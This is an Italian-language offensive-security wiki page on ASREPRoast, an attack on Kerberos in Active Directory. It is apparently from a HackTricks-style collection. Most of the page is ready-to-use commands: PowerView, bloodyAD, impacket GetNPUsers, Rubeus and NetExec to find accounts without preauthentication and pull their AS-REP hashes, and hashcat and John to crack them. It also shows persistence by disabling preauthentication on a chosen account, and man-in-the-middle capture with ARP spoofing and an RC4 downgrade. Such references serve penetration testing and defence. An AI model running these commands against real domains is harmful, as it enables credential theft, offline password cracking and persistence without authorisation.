# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un attacco di sicurezza che sfrutta gli utenti che non dispongono dell'**attributo Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attacker di richiedere l'autenticazione per un utente dal Domain Controller (DC) senza bisogno della password dell'utente. Il DC risponde poi con un messaggio cifrato con la chiave derivata dalla password dell'utente, che gli attacker possono tentare di crack offline per scoprire la password dell'utente.

I requisiti principali per questo attacco sono:

- **Mancanza di Kerberos pre-authentication**: gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
- **Connessione al Domain Controller (DC)**: gli attacker devono avere accesso al DC per inviare richieste e ricevere messaggi cifrati.
- **Account di dominio opzionale**: avere un account di dominio consente agli attacker di identificare in modo più efficiente gli utenti vulnerabili tramite query LDAP. Senza un tale account, gli attacker devono indovinare i nomi utente.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Richiesta messaggio AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus richiede **RC4** di default, quindi l'Event ID **4768** di solito mostra **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (o RC4 è disabilitato per il target), aspettati invece **AES etypes**.

#### Quick one-liners (Linux)

- Enumera prima i potenziali target (ad es., da leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast un'intera lista di username senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Se hai credenziali, fai interrogare LDAP a NetExec e richiedi per te ogni account roastable: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Se l'output inizia con **`$krb5asrep$23$`**, crackalo con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John **`--format=krb5asrep`**.

### Cracking

Non dare per scontato che ogni AS-REP roast sia RC4. I tool moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è per **etype 23**, mentre **John** gestisce `krb5asrep` direttamente per **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Forza **preauth** non richiesto per un utente per cui hai permessi **GenericAll** (o permessi per scrivere proprietà):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast senza credenziali

Un attacker può usare una posizione man-in-the-middle per catturare i pacchetti AS-REP mentre attraversano la rete senza fare affidamento sul fatto che la Kerberos pre-authentication sia disabilitata. Funziona quindi per tutti gli utenti sulla VLAN.\
Se vuoi il relativo trick senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal no-preauth, vedi [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci consente di farlo. La modalità `relay` è quella interessante in offensiva perché può forzare **RC4** quando il client pubblicizza ancora **etype 23**; `listen` resta passiva e si limita a catturare ciò che client/DC hanno negoziato.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
